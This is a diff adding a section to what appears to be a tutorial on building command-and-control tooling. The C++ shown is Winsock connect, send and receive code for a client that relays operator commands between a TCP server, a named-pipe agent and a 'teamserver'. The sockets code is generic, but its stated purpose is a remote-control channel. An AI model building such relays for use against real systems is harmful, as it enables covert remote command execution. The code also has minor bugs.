@@ -374,3 +374,84 @@ DWORD ReadData( HANDLE hNamedPipe, char* DATA ) {
 ```
 
 That's how our agent looks like.
+
+## Build our third-party client
+
+This client should be mix of the agent and the third-party server, because we will need to connect to the TCP server to receive the command and write it into the named pipe then wait until the agent execute the command and write again the data into the pipe then our client will read the data and send it back to the TCP server, then the TCP server will send the data to the teamserver. 
+
+So, I have created function called connect to connect to the TCP server. 
+```C++
+
+SOCKET Connect(string ipAddress, int port) {
+
+    WSAData data;
+    WORD    ver = MAKEWORD(2, 2);
+    int     wsResult = WSAStartup(ver, &data);
+
+    if (wsResult != 0)
+    {
+        printf("Can't start Winsock, Err # %i\n", wsResult);
+        return 0 ;
+    }
+
+    SOCKET  sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET)
+    {
+        printf("Can't create socket, Err # %i\n", WSAGetLastError());
+        WSACleanup();
+        return 0 ;
+    }
+
+    sockaddr_in hint;
+    hint.sin_family = AF_INET;
+    hint.sin_port = htons(port);
+    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);
+
+
+    int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
+
+    if (connResult == SOCKET_ERROR)
+    {
+        printf("Can't connect to server, Err #%i\n", WSAGetLastError());
+        closesocket(sock);
+        WSACleanup();
+        return 0;
+    }
+    return sock;
+
+}
+```
+
+This function will return the opened socket handle to be able to send and receive message later.  
+and here is our send and receive functions.  
+
+### Send TCP Function
+```C++
+int SendData( SOCKET sock, char* DATA, DWORD DataLength ) {
+    send (sock, (char*)&DataLength , 4, 0 );
+    printf( "[*] Sending Data Size: %i, \t Data: %s\n", sizeof DATA, DATA);
+
+    return send( sock, DATA, DataLength , 0 );
+}
+
+```
+### Receive TCP Function
+```C++
+int RecData(SOCKET sock, char *DATA) {
+
+    DWORD  total = 0, temp = 0;
+
+    int size = 0;
+
+    recv(sock, (char*)&size, 4, 0);
+    printf("[*] Data Size: %i\n", size);
+
+    while (total < size) {
+        temp = recv(sock, DATA + total, size - total, 0);
+        total += temp;
+    }
+
+    return size;
+}
+```
+
